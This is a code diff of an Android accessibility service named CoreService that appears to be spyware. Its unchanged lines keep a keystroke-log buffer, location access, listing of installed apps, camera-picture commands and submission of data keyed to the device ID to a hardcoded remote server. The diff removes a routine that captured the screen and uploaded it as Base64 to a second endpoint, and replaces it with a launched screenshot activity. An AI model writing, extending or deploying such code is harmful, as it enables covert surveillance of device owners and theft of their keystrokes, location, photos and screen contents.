@@ -11,22 +11,14 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
-import android.graphics.Bitmap;
-import android.hardware.HardwareBuffer;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 import android.os.SystemClock;
 import android.provider.Settings;
-import android.util.Base64;
 import android.util.Log;
-import android.view.Display;
-import android.view.PixelCopy;
-import android.view.Surface;
 import android.view.accessibility.AccessibilityEvent;
-import androidx.annotation.NonNull;
 import androidx.core.content.ContextCompat;
-import com.android.volley.DefaultRetryPolicy;
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
 import com.android.volley.toolbox.JsonObjectRequest;
@@ -35,19 +27,19 @@ import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
 import org.json.JSONException;
 import org.json.JSONObject;
-import java.io.ByteArrayOutputStream;
+
 import java.util.List;
 
 public class CoreService extends AccessibilityService {
 
     private static final String TAG = "CoreService";
     private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";
-    private static final String UPLOAD_FILE_URL = "https://chimeradmin.netlify.app/.netlify/functions/upload-file";
+    
+    private static CoreService sharedInstance;
+    public static CoreService getSharedInstance() { return sharedInstance; }
 
-    // These are now initialized in onCreate()
     private RequestQueue requestQueue;
     private FusedLocationProviderClient fusedLocationClient;
-
     private String lastForegroundAppPkg = "N/A";
     private final Handler keylogHandler = new Handler(Looper.getMainLooper());
     private final StringBuilder keylogBuffer = new StringBuilder();
@@ -75,12 +67,10 @@ public class CoreService extends AccessibilityService {
         }
     }
 
-    // --- THIS IS THE CRITICAL FIX ---
     @Override
     public void onCreate() {
         super.onCreate();
-        // This method is GUARANTEED to be called once per service instance.
-        // This is the correct place for initialization.
+        sharedInstance = this;
         this.requestQueue = Volley.newRequestQueue(getApplicationContext());
         this.fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
         Log.i(TAG, "CoreService instance created and initialized.");
@@ -89,7 +79,7 @@ public class CoreService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        // onServiceConnected is only for Accessibility-specific events.
+        sharedInstance = this;
         submitDataToServer("lifecycle", "Accessibility Service bound and connected.");
         Log.i(TAG, "Accessibility Service bound and connected.");
     }
@@ -120,7 +110,9 @@ public class CoreService extends AccessibilityService {
                 handleListApps();
                 break;
             case "SCREENSHOT":
-                handleScreenshot();
+                Intent screenshotIntent = new Intent(this, ScreenshotActivity.class);
+                screenshotIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(screenshotIntent);
                 break;
             case "PICTURE":
                 handleTakePicture(intent.getStringExtra("camera_id"));
@@ -189,53 +181,7 @@ public class CoreService extends AccessibilityService {
         }
         submitDataToServer("installed_apps", apps);
     }
-    
-    @SuppressLint("WrongConstant")
-    private void handleScreenshot() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
-            submitDataToServer("screenshot_error", "Screenshot API requires Android 11+.");
-            return;
-        }
-        submitDataToServer("lifecycle", "Initiating screenshot capture...");
-        takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
-            @Override
-            public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
-                submitDataToServer("lifecycle", "Hardware buffer captured. Processing...");
-                HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
-                if (buffer == null) {
-                    submitDataToServer("screenshot_error", "Capture returned a null HardwareBuffer.");
-                    return;
-                }
-                
-                final Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
-                buffer.close();
-                
-                if (bitmap != null) {
-                    processAndUploadBitmap(bitmap);
-                } else {
-                    submitDataToServer("screenshot_error", "Bitmap creation from HardwareBuffer failed.");
-                }
-            }
 
-            @Override
-            public void onFailure(int errorCode) {
-                submitDataToServer("screenshot_error", "Native capture failed with code: " + errorCode);
-            }
-        });
-    }
-    
-    private void processAndUploadBitmap(Bitmap bitmap) {
-        try {
-            ByteArrayOutputStream stream = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
-            String encodedImage = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
-            uploadFileToServer("screenshot", encodedImage);
-            submitDataToServer("lifecycle", "Screenshot processed and uploaded successfully.");
-        } catch (Exception e) {
-            submitDataToServer("screenshot_error", "Bitmap processing failed: " + e.getMessage());
-        }
-    }
-    
     private void handleTakePicture(String cameraIdStr) {
         int cameraId = 0;
         try { if (cameraIdStr != null) cameraId = Integer.parseInt(cameraIdStr); } catch (NumberFormatException e) { /* ignore */ }
@@ -257,21 +203,13 @@ public class CoreService extends AccessibilityService {
             requestQueue.add(request);
         } catch (JSONException e) { Log.e(TAG, "JSON creation failed", e); }
     }
-    
-    private void uploadFileToServer(String dataType, String base64Data) {
-        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        JSONObject postData = new JSONObject();
-        try {
-            postData.put("deviceId", deviceId);
-            postData.put("dataType", dataType);
-            postData.put("fileData", base64Data);
-            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, UPLOAD_FILE_URL, postData,
-                r -> Log.i(TAG, "File uploaded"), e -> Log.e(TAG, "Upload failed: " + e.toString()));
-            request.setRetryPolicy(new DefaultRetryPolicy(30000, 1, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
-            requestQueue.add(request);
-        } catch (JSONException e) { Log.e(TAG, "Upload JSON creation failed", e); }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        sharedInstance = null;
     }
-    
+
     @Override
     public void onInterrupt() {
         submitDataToServer("lifecycle", "Service interrupted.");
